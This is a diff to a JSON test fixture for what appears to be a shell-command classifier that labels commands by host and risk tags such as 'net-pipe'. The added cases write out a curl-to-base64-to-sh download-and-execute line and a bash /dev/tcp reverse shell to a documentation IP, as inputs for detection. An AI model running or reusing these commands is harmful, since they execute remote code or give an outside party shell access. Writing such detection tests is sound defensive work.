@@ -404,7 +404,7 @@
     "expect": {
       "kind": "exec",
       "hosts": ["get.example.sh"],
-      "opaque": ["interpreter"]
+      "opaque": ["interpreter", "net-pipe"]
     }
   },
   {
@@ -412,7 +412,7 @@
     "expect": {
       "kind": "exec",
       "hosts": ["evil.example"],
-      "opaque": ["interpreter"]
+      "opaque": ["interpreter", "net-pipe"]
     }
   },
   {
@@ -675,7 +675,7 @@
       "kind": "exec",
       "verbs": ["rsync", "sh", "curl"],
       "hosts": ["evil.example", "h.example"],
-      "opaque": ["interpreter"]
+      "opaque": ["interpreter", "net-pipe"]
     }
   },
   {
@@ -738,6 +738,22 @@
       "kind": "exec",
       "paths": [],
       "opaque": ["dynamic-command"]
+    }
+  },
+  {
+    "command": "curl -s https://x.example/p | base64 -d | sh",
+    "expect": {
+      "kind": "exec",
+      "hosts": ["x.example"],
+      "opaque": ["decoded-pipe", "net-pipe"]
+    }
+  },
+  {
+    "command": "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
+    "expect": {
+      "kind": "exec",
+      "hosts": ["203.0.113.9"],
+      "opaque": ["interpreter", "net-pipe"]
     }
   }
 ]
